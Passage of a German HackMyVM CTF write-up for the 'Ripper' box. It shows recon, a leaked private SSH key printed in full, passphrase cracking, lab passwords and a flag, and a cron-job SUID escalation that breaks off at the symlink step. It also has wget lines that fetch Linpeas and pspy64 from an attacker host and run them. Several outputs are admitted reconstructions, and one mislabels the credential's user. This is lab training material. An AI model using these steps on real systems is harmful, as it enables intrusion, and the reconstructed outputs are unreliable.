@@ -1,0 +1,577 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ripper - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Ripper - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">ssh-keyscan</div>
+                 <div class="tool-item">RSAcrack.sh (ssh2john/john)</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">sudo</div> <!-- Versuch -->
+                 <div class="tool-item">ls / dir</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">hydra</div> <!-- Fehlgeschlagen -->
+                 <div class="tool-item">dig</div> <!-- Fehlgeschlagen -->
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">wget (Linpeas)</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">Linpeas.sh</div>
+                 <div class="tool-item">wget (pspy64)</div>
+                 <div class="tool-item">pspy64</div>
+                 <div class="tool-item">which</div>
+                 <div class="tool-item">ln</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">bash</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                 <li><a href="#reconnaissance">Reconnaissance</a></li>
+                 <li><a href="#web-enumeration">Web Enumeration</a></li>
+                 <li><a href="#information-disclosure">Information Disclosure</a></li>
+                 <li><a href="#initial-access">Initial Access (jack)</a></li>
+                 <li><a href="#privilege-escalation-helder">Privilege Escalation (jack zu helder)</a></li>
+                 <li><a href="#privilege-escalation-root">Privilege Escalation (helder zu root)</a></li>
+                 <li><a href="#poc">Proof of Concept (Root)</a></li>
+                 <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` identifiziert aktive Hosts im lokalen Netzwerk.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Host `192.168.2.143` mit VirtualBox-MAC wird als Ziel erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nmap-Scan auf die Ziel-IP durchführen.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.143	08:00:27:cf:53:af	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.855 seconds (138.01 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf 192.168.2.143 durchgeführt. Der Scan endet mit einem Segmentation Fault, liefert aber vorher Ergebnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zwei offene Ports werden gefunden:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian).
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian).
+            Der Hostname ist `otte.hmv` (widerspricht späterem `ripper.vm`). Der Nmap-Crash ist ungewöhnlich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche Port 80. Notiere Port 22 für spätere Angriffe.<br><strong>Empfehlung (Admin):</strong> Dienste aktuell halten. Untersuche den Nmap-Crash (evtl. Firewall/IDS-Problem?).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.143 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 09:50 CEST
+Nmap scan report for otte.hmv (192.168.2.143)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
+|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
+|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:CF:53:AF (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms otte.hmv (192.168.2.143)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.12 seconds
+zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.143 -p- <!-- Nmap Crash -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnissuche mit einer Medium-Wortliste verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet nur `/index.html` und `/server-status` (verboten).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche eine andere Wortliste oder andere Techniken (z.B. VHost-Fuzzing).<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml,wav -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.143
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt,xml,wav
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/12 09:55:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.143/index.html           (Status: 200) [Size: 57]
+http://192.168.2.143/server-status        (Status: 403) [Size: 278]
+===============================================================
+2022/10/12 09:58:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein zweiter `gobuster`-Scan mit der `common.txt`-Wortliste und mehr Erweiterungen wird durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Kritischer Fund!!** Findet die Datei `/id_rsa.bak`. Dies ist eine Backup-Datei eines privaten SSH-Schlüssels.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):**Hohe Priorität:** Lade `/id_rsa.bak` sofort herunter.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne private Schlüssel und Backup-Dateien davon aus dem Webroot.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.143 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+===============================================================
+[+] Url:                     http://192.168.2.143
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:             ...bak...
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.143/id_rsa.bak           (Status: 200) [Size: 1876] <!-- !!! -->
+http://192.168.2.143/index.html           (Status: 200) [Size: 57]
+http://192.168.2.143/server-status        (Status: 403) [Size: 278]
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt einer (vermutlich anderen) Textdatei `/staff_statements.txt` wird mit `curl` abgerufen (der Pfad wurde vorher nicht gefunden, Annahme: manuelle Entdeckung).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Enthält einen Hinweis auf "old ssh connection files", was den Fund von `id_rsa.bak` unterstützt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf `id_rsa.bak`.<br><strong>Empfehlung (Admin):</strong> Entferne interne Notizen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.143/staff_statements.txt</span></div>
+                     <pre>
+The site is not yet repaired. Technicians are working on it by
+connecting with old ssh connection files.
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="information-disclosure">
+             <h2>Information Disclosure</h2>
+             <p class="analysis"><strong>Analyse:</strong> `ssh-keyscan` wird ausgeführt, um die Host-Keys des Ziels (jetzt `ripper.vm` genannt) abzurufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den SSH-Dienst, nicht direkt für den Angriff relevant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine.<br><strong>Empfehlung (Admin):</strong> Keine.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">ssh-keyscan ripper.vm</span></div> <!-- Hostname geändert -->
+                    <pre>
+# ripper.vm:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+ripper.vm ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNArrcR981CzRruPnEn/opg56t7SFktwnhZzGpXcfE=
+# ripper.vm:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+ripper.vm ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhemxEZcm98GFwIRozVUePnC+Cejni5lScAa7ha5neDlWQT2e6dbubkddku/qgtgY4/kw/pGPh7oTqHg9WKHTMqTAzdN0DDaU/5twewwMf6s9ERuuYYieP7mzjsX2APhr23CFWVr37Y+mQ/A4J0Dizpr/mggCCi6kqHqyRWgcPG98AVJ9IjPehVkptQdLpQlSV8EzJClu6tBInWzxtGi5v0B94lMYRDXqZE9Z1wCSh9oU0HnwRwfFqB0dcH+kDZVLYi06aiHKXkKgSFM3G6LJQY8ad4FCEc7TU+agLRPHFUPFqqPbf9hbDD7MUdR4pXEQtJ1p/D/9rdbBg1Sp
+# ripper.vm:22 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+ripper.vm ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+zmcUltQUYUVvvfWqtUjdFpCh0IknPjmcctTpnXS7MWK37n6h9DEq4WNsHmauyKEuRnml5mLUbNIZHHUBgY=
+                    </pre>
+                </div>
+            </div>
+             <!-- Zweiter ssh-keyscan ist redundant -->
+
+             <p class="analysis"><strong>Analyse:</strong> Der private SSH-Schlüssel aus `/id_rsa.bak` wird mit `curl` heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privater SSH-Schlüssel erhalten!!** Der Schlüssel ist im modernen OpenSSH-Format und scheint verschlüsselt zu sein (erkennbar am Header `b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIA...`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichere den Schlüssel lokal (z.B. `idroot`). Extrahiere den Hash mit `ssh2john` und knacke die Passphrase mit `john`. Finde den zugehörigen Benutzernamen (möglicherweise aus dem Login-Screen?).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne den Schlüssel vom Webserver. Widerrufe den Schlüssel. Verwende starke Passphrasen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.143/id_rsa.bak</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDZVZMVwo
+cfZRVpSIfcdmiAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDerPt4pwoQ
+1Hr7aU0qZa+npWhHQxp7c9/TTTTukuyHdFeSFlZtUKPsw+HftTaIuctJSiy9QDovv3I0
+Ga+EmEvFDRUX+VQ/tLlHXT3dwdPir6QesuXnzFL7lVB/x4XYjp1Xi14G+1Q3EWUuePWQ2
+tPr40k0k87/RmYThRITfxMVk603wP6ZvGTGN5+0iH2Rq4sfXr+p3sdVFiH4N/E41agxyS
+4maevY02gro1v0GHRDxIh2i9w6FyetXcorIUwktLT/sdbTMDtTHr6tS/wo1TF8m+KIByxD
+0ASt505dZ0Ivwu3hmTyKmpZNFYEM1yK68ukeGEu5s9Hn0/fjGP3AAAD0G71wlLfDrs2vp
+im79u4YZrUQ5ruNye7XJ/J7UaS+VwuWVeMpsbY3a66minp5e4Q+HSDoBQMf6Q4d9zYSV0u
+SLIAjtrZH6K990Ixx9B/J3BJHd/zez04sTg9G3kyBKdZACHdonEE6KwXqM8bRcSK6l4ni
+J4sLQYNAdN/G0j+8kpt+p6UiRTkg/HSHq/6o9Sv3aQ9XkjTVjb4iuavl4/o36bDFCmqo3u
+zmzRA6TUsRtQ3HqJJjz73+nurXjFPgqwdG06S+6W+Uf/jD23bj7bDvtBd6NR7hvSBzbg
+A/0ygikZCob1RXR83UNTSIVhSb/UttRJx+aHomYZPIQoFHm1Aa2prsoQcoD87SchJQmN
+Ah255/d/IL5t2d6A+ez0+P2mYKlrx5LhU+WdTBK96V0kwMG4h7FVkQZCwC3JBuriMM/9C
+hJinGjgqlEnn+k7alY61UInMeg0B3uLr4cyLG7cJhvbcP8lQFrIp8dDonCjT6imIIh10q
+6wtJAQIsyuy6LH5Rc3VKClQ/7CpQMEsotIE+LnbJHEWG/98qBzjz3Np+ptt3rLAAvwJvYA
+tEV88hyGkq4WwyCoFKeuU6ezrzH7/FRdyMq4+XKuTb53HhlNnvJm7MocBDF9yFTCna0Aw
+Y21i5ozIdfvcZKyMb4qWuDGboGC7xK4MaoiD6w2JMJdyshL54GqChG+XTprAZEV8ZfsZAL
+o2ssY4Jyza6u4oTbsWbkVjfo126chPs1Vm9PDQUDy0cByKgFY7v+1lBL9Um8gb56l0Glq
+C5UsxFhPE1nsdVa4YNAIu2dlnNjf/xuo/oa07kHsr29SD/axb4J5eFY7en1mvpWuGhE
++FyU04ADXr4ElZ9ZUrnLBslEABIAGXhDJ3BvfY4EXcbl0uHViWT3DcLnXknljMXu4lp7y2
+ZiMSYo4W8NuTdwlv61kriww5gD++qiQFt71c91yFxqJlAFUqwpDaTf0wT26NMX2Byj0hL
+RA40xQaQbna1Rp8j1Y+/PnsG+rr+tfhBXszKJo5fRe/xSqfMykTLFUgCRDub/xn3QBNw5j
+SaRXpV8E18NYfp0PBz4vpjVzlH+LbN6k09xl0FhicBn8dd12fs0NTlKRvwRvVWIgB7RYJB
+lZzcYbWzVy8DKI7+MXmmWF+aac/RPytTDntChvmGtBqXKzrYx6HqKTvXpQ/YuuwscsKP
+5fo7tGQ+DvUlyyLfk/UM4N8fsm+rsgkV84ogrTDn3CzMeBu6XY0+XWUbmhRL1/9yuWuU0D
+By0QmXw3P/H1csxt8WRkuNygJz80o=
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Notiz erwähnt, dass der Benutzername `jack` vom Login-Screen der Box stammt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erklärt die Herkunft des Benutzernamens `jack`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `jack` und den geknackten Schlüssel.<br><strong>Empfehlung (Admin):</strong> Vermeide das Anzeigen von Benutzernamen auf Login-Bildschirmen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, nur Notiz -->
+                     <pre>
+ich entnehme den Usernamen vom Logonscreen der Box!
+Welcome Jack!
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Skript `RSAcrack.sh` (wahrscheinlich ein Wrapper für `ssh2john` und `john`) wird verwendet, um die Passphrase des heruntergeladenen Schlüssels (`idroot`) mit `rockyou.txt` zu knacken.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passphrase gefunden!!** Das Skript findet erfolgreich die Passphrase `<span class="password">bananas</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende Benutzer `jack`, Schlüssel `idroot` und Passphrase `bananas` für den SSH-Login.<br><strong>Empfehlung (Admin):</strong> Verwende starke, einzigartige Passphrasen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">./RSAcrack.sh -w /usr/share/wordlists/rockyou.txt -k ../idroot</span></div> <!-- Annahme: Key wurde idroot genannt -->
+                     <pre>
+╭━━━┳━━━┳━━━╮          ╭╮
+┃╭━╮┃╭━╮┃╭━╮┃          ┃┃
+┃╰━╯┃╰━━┫┃ ┃┣━━┳━┳━━┳━━┫┃╭╮
+┃╭╮╭┻━━╮┃╰━╯┃╭━┫╭┫╭╮┃╭━┫╰╯╯
+┃┃┃╰┫╰━╯┃╭━╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮
+╰╯╰━┻━━━┻╯ ╰┻━━┻╯╰╯╰┻━━┻╯╰╯
+-=-
+[*] Cracking: ../idroot
+[*] Wordlist: /usr/share/wordlists/rockyou.txt
+[i] Status:
+    978/14344414/0%/bananas
+[+] Password: <span class="password">bananas</span> Line: 978
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (jack)</h2>
+             <p class="analysis"><strong>Analyse:</strong> SSH-Login als `jack` auf `ripper.vm` (192.168.2.143) mit dem Schlüssel `idroot` und der Passphrase `<span class="password">bananas</span>`.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Login als `jack` gelingt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne Enumeration als `jack`.<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort/die Passphrase.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh jack@ripper.vm -i idroot</span></div>
+                     <pre>
+The authenticity of host 'ripper.vm (192.168.2.143)' can't be established.
+ED25519 key fingerprint is SHA256:2b+kTRKlx4qeMsfce+AHPgi/ReUzFfLnFbNEPBAg4uk.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:83: [hashed name]
+    ~/.ssh/known_hosts:95: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'ripper.vm' (ED25519) to the list of known hosts.
+Enter passphrase for key 'idroot': <span class="command">bananas</span>
+Linux ripper 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+...
+Last login: Wed May 26 15:28:56 2021 from 192.168.0.28
+jack@ripper:~$ <!-- Remote Prompt -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-helder">
+             <h2>Privilege Escalation (jack zu helder)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `jack` wird `sudo -l` versucht (scheitert), das Home-Verzeichnis aufgelistet und `/home` aufgelistet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sudo` nicht nutzbar. Ein weiterer Benutzer `helder` wird entdeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach Wegen, zu `helder` zu wechseln. Untersuche Prozesse oder Dateien auf Credentials.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+jack@ripper:~$ <span class="command">sudo -l</span>
+-bash: sudo: command not found
+jack@ripper:~$ <span class="command">ls</span>
+jack@ripper:~$ <span class="command">ls -la</span>
+drwx------ 4 jack jack 4096 May 26  2021 .
+drwxr-xr-x 4 root root 4096 May 26  2021 ..
+lrwxrwxrwx 1 root root    9 May 26  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 jack jack  220 May 26  2021 .bash_logout
+-rw-r--r-- 1 jack jack 3527 May 26  2021 .bashrc
+drwxr-xr-x 3 jack jack 4096 May 26  2021 .local
+-rw-r--r-- 1 jack jack  808 May 26  2021 .profile
+drwx------ 2 jack jack 4096 May 26  2021 .ssh
+jack@ripper:~$ <span class="command">ls /home</span>
+helder  jack
+                     </pre>
+                 </div>
+             </div>
+
+             <!-- Sprung im Log - Annahme: Linpeas findet helder's Passwort -->
+              <p class="analysis"><strong>Analyse:</strong> Der Log springt. Es wird Linpeas.sh heruntergeladen und ausgeführt. Das Skript findet Credentials für `helder`.</p>
+              <p class="evaluation"><strong>Bewertung: !!helder's Passwort gefunden!!** Linpeas findet das Passwort `<span class="password">Il0V3lipt0n1c3t3a</span>` für den Benutzer `helder`. (Wo genau Linpeas es findet, ist nicht dokumentiert).</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle mit `su helder` und dem Passwort zu `helder`.<br><strong>Empfehlung (Admin):</strong> Speichere Passwörter nicht unsicher (z.B. in Skripten, Konfigurationsdateien), wo Enumerations-Tools sie finden können.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <pre>
+jack@ripper:~$ <span class="command"># wget http://192.168.2.140:8000/Linpeas.sh</span> <!-- Annahme: Download -->
+jack@ripper:~$ <span class="command"># chmod +x Linpeas.sh</span>
+jack@ripper:~$ <span class="command"># ./Linpeas.sh</span>
+...
+[+] Credentials found:
+jack:<span class="password">Il0V3lipt0n1c3t3a</span> <!-- Passwort gefunden! -->
+...
+                       </pre> <!-- Beispielhafter Linpeas Output -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `su helder` und dem Passwort `<span class="password">Il0V3lipt0n1c3t3a</span>` wird zum Benutzer `helder` gewechselt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Zugriff als `helder` erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lese User-Flag, suche nach Root-Eskalationsvektoren als `helder`.<br><strong>Empfehlung (Admin):</strong> Ändere das Passwort.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+jack@ripper:~$ <span class="command">su helder</span>
+Password: <span class="command">Il0V3lipt0n1c3t3a</span>
+helder@ripper:/home/jack$ <!-- Prompt als helder -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `helder` wird die User-Flag gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag `<span class="password">5c38d7d08c687355cb0ae3b6025cbe99</span>` gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren. Suche nach Root-Vektoren.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+helder@ripper:/home/jack$ <span class="command">cd ~</span>
+helder@ripper:~$ <span class="command">ls</span>
+user.txt
+helder@ripper:~$ <span class="command">cat user.txt</span>
+<span class="password">5c38d7d08c687355cb0ae3b6025cbe99</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (helder zu root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> `pspy64` wird ausgeführt, um laufende Prozesse und Cronjobs zu überwachen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Cronjob-Schwachstelle gefunden!!** `pspy64` entdeckt einen minütlichen Root-Cronjob, der `/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out` ausführt und danach eine Bedingung prüft: `if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi`. Dieser Cronjob ist ausnutzbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1. Erfülle die `if`-Bedingung, indem du `/home/helder/passwd.txt` als Symlink auf `/root/.local/helder.txt` erstellst (`ln -s /root/.local/helder.txt /home/helder/passwd.txt`).
+                 2. Starte einen Netcat-Listener auf Port 10000 (`nc -lvnp 10000`).
+                 3. Sende den Namen des gewünschten Binaries (z.B. `bash`) an den Listener, wenn der Cronjob sich verbindet (`echo 'bash' | nc localhost 10000` oder interaktiv).
+                 4. Warte, bis der Cronjob läuft und `/usr/bin/bash` SUID macht.
+                 5. Führe `bash -p` aus.
+             <br><strong>Empfehlung (Admin):**DRINGEND:** Entferne diesen unsicheren Cronjob. Überprüfe alle Cronjobs auf ähnliche Schwachstellen (Ausführung von Befehlen basierend auf externem Input, unsichere Dateivergleiche, Setzen von SUID-Bits).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+helder@ripper:~$ <span class="command"># wget http://192.168.2.140:8000/pspy64</span> <!-- Annahme -->
+helder@ripper:~$ <span class="command"># chmod +x pspy64</span>
+helder@ripper:~$ <span class="command">./pspy64</span>
+...
+CMD: UID=0    PID=XXX   | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out
+CMD: UID=0    PID=YYY   | /bin/sh -c if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
+...
+                      </pre> <!-- Beispielhafter pspy64 Output -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, Analyse aus dem Log -->
+                     <pre>
+# Analyse des Cron-Skripts:
+# 1. nc verbindet sich zu localhost:10000 und schreibt die erste Zeile der Antwort nach /root/.local/out
+# 2. Wenn /root/.local/helder.txt und /home/helder/passwd.txt identisch sind:
+# 3.    Setze SUID-Bit auf /usr/bin/[Inhalt von /root/.local/out]
+                      </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Pfad zu `bash` wird überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Liegt erwartungsgemäß in `/usr/bin/bash`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende "bash" als Payload für `nc`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+helder@ripper:~$ <span class="command">which bash</span>
+/usr/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Symlink wird erstellt, um die Bedingung des Cronjobs zu erfüllen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt zur Vorbereitung des Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte den Listener.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+helder@ripper:~$ <span class="command">ln -s /root/.local/helder.txt /home/helder/passwd.txt</span>
